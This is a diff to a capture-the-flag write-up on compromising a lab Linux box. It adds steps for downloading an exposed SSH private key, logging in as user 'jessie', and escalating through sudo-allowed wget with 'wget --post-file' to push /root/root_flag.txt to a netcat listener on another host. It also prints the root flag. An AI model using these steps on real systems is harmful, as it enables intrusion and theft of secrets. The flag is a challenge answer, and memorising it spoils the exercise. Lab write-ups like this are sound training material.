@@ -18,6 +18,10 @@
     MAC Address: 06:9E:F2:B8:90:73 (Unknown)
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+<img width="915" height="733" alt="image" src="https://github.com/user-attachments/assets/9f90f49b-166e-4769-9c74-977fc4f8af5f" />
+
+<img width="912" height="249" alt="image" src="https://github.com/user-attachments/assets/51857c63-252c-42d6-bffd-dcff77687afc" />
+
 ### Dirsearch
 
 `dirsearch -u http://10.113.186.73/`
@@ -45,9 +49,17 @@ http://10.113.186.73/sitemap/.ssh/id_rsa
 
 <img width="507" height="434" alt="image" src="https://github.com/user-attachments/assets/b845453a-d29f-4f6e-99cf-9c20b25e5aad" />
 
+wget http://10.113.186.73/sitemap/.ssh/id_rsa
+
 chmod 600 id_rsa
 
 sudo ssh -i ~/.ssh/id_rsa jessie@10.113.186.73
+
+<img width="717" height="264" alt="image" src="https://github.com/user-attachments/assets/3630da6b-0805-4e20-bab2-326e6d47b1af" />
+
+find ~/ flag.txt
+
+<img width="433" height="134" alt="image" src="https://github.com/user-attachments/assets/caff6dcb-b5eb-480e-a8b1-2ba89492937d" />
 
 User flag:
 
@@ -65,3 +77,14 @@ User flag:
         (ALL : ALL) ALL
         (root) NOPASSWD: /usr/bin/wget
 
+`sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.114.160.103:123`
+
+<img width="873" height="76" alt="image" src="https://github.com/user-attachments/assets/6df59131-f180-417d-8327-438a5d9c20e3" />
+
+`nc -nlvp 123`
+
+<img width="524" height="287" alt="image" src="https://github.com/user-attachments/assets/dac58513-a860-4a2e-bb18-956f689f6f07" />
+
+Root flag:
+
+    b1b968b37519ad1daa6408188649263d
